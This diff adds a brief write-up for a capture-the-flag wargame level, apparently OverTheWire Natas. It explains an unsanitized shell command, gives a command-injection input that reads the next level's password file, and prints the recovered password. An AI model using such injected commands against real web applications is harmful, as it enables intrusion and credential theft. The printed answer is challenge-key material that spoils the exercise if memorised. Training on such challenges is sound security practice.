@@ -1,0 +1,6 @@
+If you check the code you can see that there're bash code being executed without sanitization. Just execute a command to get the password.
+
+; sh -c "cat /etc/natas_webpass/natas10"
+
+t7I5VHvpa14sJTUGV0cbEsbYfFP2dmOu
+
